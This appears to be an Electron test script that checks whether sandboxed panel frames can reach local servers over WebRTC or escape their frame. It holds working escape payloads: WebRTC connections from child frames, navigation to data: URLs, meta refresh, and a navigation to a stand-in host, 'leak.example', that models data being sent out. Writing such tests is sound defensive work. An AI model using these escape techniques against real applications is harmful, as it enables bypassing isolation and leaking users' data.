/*
  Run by panel-network.test.ts inside real Electron: a page under the panel policy tries to reach
  local servers over WebRTC, one case at a time (a frame that asks has its process ended, which
  would hide whatever it tried next), and each case's result is printed as one JSON line.
*/
const { app, BrowserWindow } = require("electron");
const dgram = require("node:dgram");
const http = require("node:http");
const net = require("node:net");
const { checkConnections, panelDocument, panelFrame, panelFrameUrl, sealedFrame } = require(process.env.PANEL_BUNDLE);

// A leak reaches its server in under 400ms from the page loading, so a case waits well past that.
const BLOCKED_MS = 1500;
const OPEN_MS = 4000;
const TRANSPORTS = ["stun", "turn-udp", "turn-tcp"];

/** A server for one transport: what reaches it counts, whatever it is. */
const listen = async (kind) => {
  const seen = { hits: 0 };
  if (kind === "turn-tcp") {
    const s = net.createServer((c) => (seen.hits++, c.on("error", () => {}), c.resume()));
    await new Promise((ok) => s.listen(0, "127.0.0.1", ok));
    return { seen, close: () => s.close(), url: `turn:127.0.0.1:${s.address().port}?transport=tcp` };
  }
  const s = dgram.createSocket("udp4");
  s.on("message", () => seen.hits++);
  await new Promise((ok) => s.bind(0, "127.0.0.1", ok));
  const at = `127.0.0.1:${s.address().port}`;
  return { seen, close: () => s.close(), url: kind === "stun" ? `stun:${at}` : `turn:${at}?transport=udp` };
};

// What a page runs. `R` is the constructor, so a child's can be tried from its parent.
const attempt = `(R,u)=>{const p=new R({iceServers:[{urls:u,username:"u",credential:"p"}]});p.createDataChannel("x");p.createOffer().then((o)=>p.setLocalDescription(o));(self.kept||=[]).push(p)}`;
const inFrame = (url) => `(${attempt})(RTCPeerConnection,${JSON.stringify(url)})`;
// Each in its own block: a page tries several, and they all name a frame `f`.
const script = (js) => `<script>{${js}}</` + "script>";
const json = (v) => JSON.stringify(v).replaceAll("<", "\\u003c");
const WAYS = {
  top: (url) => script(inFrame(url)),
  // A child that can run a script: a srcdoc. It has constructors of its own, whatever the parent deleted.
  child: (url) => script(`const f=document.createElement("iframe");f.srcdoc=${json(script(inFrame(url)))};document.body.append(f)`),
  // An about:blank child: in a sandbox it's another opaque origin, so its parent can't reach in. That's tried anyway.
  blank: (url) => script(`const f=document.createElement("iframe");document.body.append(f);const go=()=>{try{(${attempt})(f.contentWindow.RTCPeerConnection,${json(url)})}catch{}};go();f.onload=go`),
};
/** A page elsewhere, with nothing of ours on it, that a frame sends itself to. */
const away = (url) => `data:text/html,${encodeURIComponent(script(inFrame(url)))}`;
const ESCAPES = {
  "self to data:": (url) => script(`location.href=${json(away(url))}`),
  "self to a local page": (url, origin) => script(`location.href=${json(`${origin}/open?u=${encodeURIComponent(url)}`)}`),
  "self to the web": () => script(`location.href="https://leak.example/?what=it-read"`),
  "meta refresh": (url) => `<meta http-equiv="refresh" content="0;url=${away(url)}">`,
  "child to data:": (url) => script(`const f=document.createElement("iframe");f.src=${json(away(url))};document.body.append(f)`),
  "child sends itself to data:": (url) => script(`const f=document.createElement("iframe");f.srcdoc=${json(script(`location.href=${json(away(url))}`))};document.body.append(f)`),
};
/** The panel's document with the bridge's courtesy taken out: what stops it here is the frame. */
const bare = (doc) => doc.replace("delete window.RTCPeerConnection;delete window.webkitRTCPeerConnection;", "");
const documentOf = (body, access = { files: "project" }) => panelDocument({ files: { "index.html": `<!doctype html><html><body>${body}</body></html>` }, entry: "index.html", access, theme: {}, place: "dock" });

const pages = new Map();
const host = (doc, frameSrc) =>
  `<!doctype html><title>host</title><iframe id="p" sandbox="allow-scripts" src="${frameSrc}"></iframe><script>
  self.heard=[];self.asked=0;self.lineEnds=0;const doc=${json(doc)};
  addEventListener("message",(e)=>{if(e.source!==p.contentWindow||!e.data||e.data.liner!==1)return;
  if(e.data.kind!=="frame")return heard.push(e.data);
  asked++;const c=new MessageChannel();(self.lines||=[]).push(c.port1);c.port1.addEventListener("close",()=>lineEnds++);c.port1.start();p.contentWindow.postMessage({liner:1,doc},"*",[c.port2])});</` + "script>";

const server = http.createServer((q, r) => {
  const u = new URL(q.url, "http://x");
  if (u.pathname === "/panel-frame") {
    const f = panelFrame(u.searchParams.get("network"), `http://${q.headers.host}`);
    return r.writeHead(200, f.headers).end(f.html);
  }
  // A frame like a panel's, with neither its header nor its sandbox: anybody's page, as the Browser surface shows them.
  if (u.pathname === "/open") return r.writeHead(200, { "content-type": "text/html" }).end(u.searchParams.get("u") ? script(inFrame(u.searchParams.get("u"))) : panelFrame().html);
  if (u.pathname === "/addon-check/call") return r.writeHead(200).end("{}");
  const page = pages.get(u.pathname);
  if (!page) return r.writeHead(404).end();
  r.writeHead(200, { "content-type": "text/html", ...page.headers }).end(page.html);
});

let next = 0;
/** One window, one page, its own servers. `body(url, origin)` is what the frame runs for each transport; `sealed`, whether the shell's guard is on. */
async function run({ name, kinds = TRANSPORTS, page, sealed = true, wait = BLOCKED_MS, foreign }) {
  const servers = await Promise.all(kinds.map(async (k) => [k, await listen(k)]));
  const origin = `http://127.0.0.1:${server.address().port}`;
  const path = `/case/${++next}`;
  const urls = Object.fromEntries(servers.map(([k, s]) => [k, s.url]));
  pages.set(path, page(urls, origin));
  const w = new BrowserWindow({ show: false, width: 500, height: 400, webPreferences: { sandbox: true, contextIsolation: true, backgroundThrottling: false } });
  const wc = w.webContents;
  let died = null;
  wc.on("render-process-gone", (_e, d) => (died = d.reason));
  // The window's guard, as main.ts has it: what isn't held and isn't local would open in your browser.
  const opened = [];
  wc.on("will-frame-navigate", (e) => {
    if (e.isMainFrame) return;
    if (sealed && sealedFrame(e.frame?.url, e.url, origin)) return e.preventDefault();
    if (new URL(e.url).protocol === "https:") (opened.push(e.url), e.preventDefault());
  });
  wc.loadURL(origin + path).catch(() => {});
  await new Promise((ok) => setTimeout(ok, wait));
  const out = { name, opened, hits: Object.fromEntries(servers.map(([k, s]) => [k, s.seen.hits])) };
  try {
    out.hostAlive = !died && (await Promise.race([wc.mainFrame.executeJavaScript("1+1"), new Promise((ok) => setTimeout(() => ok(0), 1000))])) === 2;
    if (out.hostAlive) out.page = await wc.mainFrame.executeJavaScript(`({heard:self.heard,got:self.got,origin:self.origin,asked:self.asked,lineEnds:self.lineEnds})`);
    out.processes = wc.mainFrame.framesInSubtree.flatMap((f) => { try { return [{ url: f.url, process: f.processId }]; } catch { return []; } });
  } catch (e) {
    out.error = String(e);
  }
  w.destroy();
  for (const [, s] of servers) s.close();
  console.log(`CASE ${JSON.stringify(out)}`);
}

/** The window's page around a panel's frame, as Addon.tsx does it, for each transport one page. */
const panelPage = (doc, src = panelFrameUrl({})) => ({ html: host(doc, src), headers: {} });

async function all() {
  await new Promise((ok) => server.listen(0, "127.0.0.1", ok));
  // The test can see, and anybody's page keeps its WebRTC: the same page in a frame with no header.
  for (const way of Object.keys(WAYS)) {
    if (way === "blank") continue;
    await run({ name: `control ${way}`, wait: OPEN_MS, page: (u) => panelPage(bare(documentOf(TRANSPORTS.map((k) => WAYS[way](u[k])).join(""))), "/open") });
  }
  for (const way of Object.keys(WAYS)) for (const k of TRANSPORTS) await run({ name: `panel ${way} ${k}`, kinds: [k], page: (u) => panelPage(bare(documentOf(WAYS[way](u[k])))) });
  // As shipped: the bridge's courtesy in place, so a panel that looks finds none, and carries on.
  await run({ name: "panel as shipped", wait: 2000, page: (u) => panelPage(documentOf(script(`liner.call("look",{webrtc:typeof RTCPeerConnection,child:typeof RTCPeerConnection})`) + TRANSPORTS.map((k) => WAYS.child(u[k])).join(""))) });
  // The one host a panel may reach doesn't open WebRTC to it, or to anything else.
  for (const k of TRANSPORTS) await run({ name: `network panel ${k}`, kinds: [k], page: (u) => panelPage(bare(documentOf(WAYS.top(u[k]), { network: "api.github.com" })), panelFrameUrl({ network: "api.github.com" })) });
  // addon_check's page: the panel in a srcdoc under a page with the header, which still reaches itself.
  const checkPage = (body, origin) => ({
    headers: { "connection-allowlist": checkConnections(origin), "content-security-policy": "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'self'; frame-src 'self' about:; child-src about:" },
    html: `<!doctype html><iframe sandbox="allow-scripts" srcdoc="${bare(documentOf(body)).replaceAll("&", "&amp;").replaceAll('"', "&quot;")}"></iframe>${script(`fetch(${json(origin + "/addon-check/call")}).then((r)=>self.got=r.status,(e)=>self.got=String(e))`)}`,
  });
  for (const k of TRANSPORTS) await run({ name: `check page ${k}`, kinds: [k], page: (u, origin) => checkPage(WAYS.child(u[k]), origin) });
  // Its frame leaving for a page of this Mac: refused with the window's guard off, too.
  await run({ name: "check page escape", sealed: false, kinds: ["stun"], page: (u, origin) => checkPage(ESCAPES["self to a local page"](u.stun, origin), origin) });
  // A frame sending itself somewhere with no allowlist of its own. Chromium refuses the way out and
  // the window's guard does too, so each is tried with the guard off as well; and from a frame with
  // no header, where the same way out does leak, or the case would prove nothing.
  for (const [how, body] of Object.entries(ESCAPES)) {
    for (const sealed of [true, false]) await run({ name: `escape ${how}${sealed ? "" : " unguarded"}`, sealed, kinds: ["stun"], page: (u, origin) => panelPage(bare(documentOf(body(u.stun, origin)))) });
  }
  await run({ name: "control escape", sealed: false, kinds: ["stun"], wait: OPEN_MS, page: (u, origin) => panelPage(bare(documentOf(ESCAPES["self to data:"](u.stun, origin))), "/open") });
  // A panel that reloads comes back, the one with a host too, and a quiet one's line stays open.
  await run({ name: "a panel reloads", kinds: [], page: () => panelPage(documentOf(script(`setTimeout(()=>location.reload(),300)`))) });
  await run({ name: "a network panel reloads", kinds: [], page: () => panelPage(documentOf(script(`setTimeout(()=>location.reload(),300)`), { network: "api.github.com" }), panelFrameUrl({ network: "api.github.com" })) });
  await run({ name: "a quiet panel", kinds: [], page: () => panelPage(documentOf("<p>quiet</p>")) });
  // A panel still works in its frame: the bridge answers, and its pictures draw.
  const dot = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
  await run({
    name: "a panel draws",
    kinds: [],
    wait: 1200,
    page: () =>
      panelPage(
        documentOf(
          `<img id="d" src="data:image/gif;base64,${dot}"><img id="b">` +
            script(`const bytes=Uint8Array.from(atob("${dot}"),(c)=>c.charCodeAt(0));b.src=URL.createObjectURL(new Blob([bytes],{type:"image/gif"}));addEventListener("load",()=>setTimeout(()=>liner.call("drew",{data:d.naturalWidth,blob:b.naturalWidth,bridge:typeof liner}),100))`),
        ),
      ),
  });
  // The frame on its own: however it's loaded, it isn't the app, so nothing a stranger writes into it can be.
  const alone = new BrowserWindow({ show: false, webPreferences: { sandbox: true } });
  await alone.loadURL(`http://127.0.0.1:${server.address().port}/panel-frame`);
  console.log(`CASE ${JSON.stringify({ name: "frame alone", origin: await alone.webContents.mainFrame.executeJavaScript("self.origin") })}`);
  alone.destroy();
  // And a page on another origin can't frame it at all.
  const stranger = http.createServer((_q, r) => r.writeHead(200, { "content-type": "text/html" }).end(`<iframe id="f" src="http://127.0.0.1:${server.address().port}/panel-frame"></iframe>${script(`self.heard=[];addEventListener("message",(e)=>heard.push(e.data))`)}`));
  await new Promise((ok) => stranger.listen(0, "127.0.0.1", ok));
  const other = new BrowserWindow({ show: false, webPreferences: { sandbox: true } });
  other.webContents.loadURL(`http://localhost:${stranger.address().port}/`).catch(() => {});
  await new Promise((ok) => setTimeout(ok, 800));
  console.log(`CASE ${JSON.stringify({ name: "framed by a stranger", heard: await other.webContents.mainFrame.executeJavaScript("self.heard") })}`);
  other.destroy();
  stranger.close();
  server.close();
}

// Each case's window closes, and that isn't the end.
app.on("window-all-closed", () => {});
app.whenReady().then(() =>
  all().then(
    () => app.exit(0),
    (e) => {
      console.log(`FAILED ${e?.stack ?? e}`);
      app.exit(1);
    },
  ),
);
